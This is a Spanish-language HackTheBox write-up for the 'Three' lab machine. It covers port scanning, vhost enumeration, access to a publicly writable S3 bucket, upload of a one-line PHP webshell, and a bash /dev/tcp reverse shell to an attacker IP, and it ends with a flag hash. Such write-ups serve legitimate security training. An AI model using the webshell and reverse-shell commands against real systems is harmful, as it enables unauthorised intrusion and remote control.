---
titulo: "Three"
descripcion: "Subdominio S3 expone bucket con acceso público. Webshell PHP subida al bucket permite RCE. Reverse shell vía bash TCP."
fecha: 2026-06-06
dificultad: easy
herramientas: ["nmap", "gobuster", "awscli", "nc"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold", "Explotación"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.58.142
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p22,80 -sCV 10.129.58.142
```

Puertos abiertos:
- **22/tcp (OpenSSH 7.6p1 — Ubuntu)**
- **80/tcp (Apache httpd 2.4.29)**

## Foothold

### Enumeración web

El sitio `http://10.129.58.142` pertenece a "The Toppers". Se identifica email `mail@thetoppers.htb`, revelando el dominio.

Agregar a `/etc/hosts`:

```bash
echo "10.129.58.142 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Descubrimiento de subdominios

Enumeración de vhosts con gobuster:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Resultado:
```
s3.thetoppers.htb (Status: 404)
```

Agregar subdominio a `/etc/hosts`:

```bash
echo "10.129.58.142 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Acceso al bucket S3

El subdominio expone un servidor S3 (Amazon Simple Storage Service) con bucket mal configurado — acceso público sin autenticación real.

Configurar credenciales dummy:

```bash
aws configure
# Access Key: temp
# Secret Key: temp
# Region: us-east-1
```

Listar contenido del bucket:

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

Resultado:
```
PRE images/
2026-06-06 16:48:41     0 .htaccess
2026-06-06 16:48:41 11952 index.php
```

El bucket almacena los archivos PHP del sitio web. Apache los sirve directamente.

### Webshell upload

El bucket tiene permisos de escritura. Se sube un webshell PHP:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

**RCE confirmado:**

```
http://thetoppers.htb/shell.php?cmd=id
```

Salida:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Explotación

### Reverse shell

Abrir listener en máquina del attacker:

```bash
nc -lvnp 4444
```

Ejecutar reverse shell vía webshell:

```bash
curl "http://thetoppers.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.36/4444+0>%261'"
```

Shell interactiva obtenida como `www-data`.

La flag se ubica en `/var/www/flag.txt`:

```bash
cat /var/www/flag.txt
```

## Flags

| Flag | Hash |
|------|------|
| Root | `a980d99281a28d638ac68b9bf9453c2b` |
